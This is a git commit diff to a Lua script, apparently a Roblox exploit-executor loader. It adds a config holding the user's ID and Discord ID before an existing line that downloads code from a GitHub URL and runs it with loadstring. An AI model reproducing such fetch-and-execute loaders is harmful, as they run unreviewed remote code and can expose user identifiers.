1b9309a28c87b18132bb74500cb7f9945eef082b
sudoxsmt <3althaza11@gmail.com>
2025-07-13 11:34:47 +0700

    Update log-yummy.lua

--- log-yummy.lua
+++ log-yummy.lua
@@ -14,5 +14,11 @@ local gagId = 126884695634066
 local bfList = {2753915549, 4442272183, 7449423635}
 
 if game.PlaceId == gagId then
+  task.wait(30)
+  _G.Config = { 
+		UserID = getgenv().UserID , 
+		discord_id = getgenv().Discord , 
+		Note = getgenv().Note, 
+  } 
   loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/gag"))()
 end
